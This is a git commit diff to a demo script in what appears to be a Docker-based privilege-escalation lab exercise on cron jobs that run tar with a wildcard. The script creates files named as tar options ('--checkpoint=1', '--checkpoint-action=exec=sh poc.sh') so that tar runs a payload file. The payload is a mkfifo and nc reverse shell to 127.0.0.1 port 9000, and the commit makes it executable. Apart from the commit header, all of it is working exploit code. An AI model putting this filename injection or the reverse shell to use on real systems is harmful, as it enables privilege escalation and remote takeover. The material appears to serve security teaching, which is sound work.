c63f661202e0bf323f6cb378cc9538e7f7886626
Tilemachos Charalampous <tilemachos.charalampous@gmail.com>
2024-10-26 11:35:20 -0700

    Refine wildcard demo script

--- docker/files/user/5.wildcard-cron/demo-wildcard.sh
+++ docker/files/user/5.wildcard-cron/demo-wildcard.sh
@@ -5,4 +5,5 @@ mkdir demo
 cd demo
 touch -- --checkpoint=1
 echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/sh -i 2>&1|nc 127.0.0.1 9000 >/tmp/f' > poc.sh
+chmod +x poc.sh
 touch -- "--checkpoint-action=exec=sh poc.sh"
